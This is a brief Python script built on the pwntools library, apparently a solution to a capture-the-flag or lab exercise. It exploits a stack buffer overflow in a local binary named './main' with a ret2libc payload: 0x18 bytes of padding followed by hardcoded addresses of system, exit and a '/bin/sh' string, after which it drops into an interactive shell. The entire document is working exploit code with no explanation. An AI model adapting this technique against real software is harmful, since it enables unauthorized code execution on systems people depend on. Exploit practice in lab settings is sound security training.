##coding=utf8 
from pwn import * 
sh = process('./main') 
system_addr = 0xf7e1a420
exit_addr = 0xf7e0cf80
bin_str_addr = 0xf7f64352
payload = '0' * 0x18 + p32(system_addr) + p32(exit_addr) + p32(bin_str_addr)
sh.sendline(payload) 
sh.interactive() 
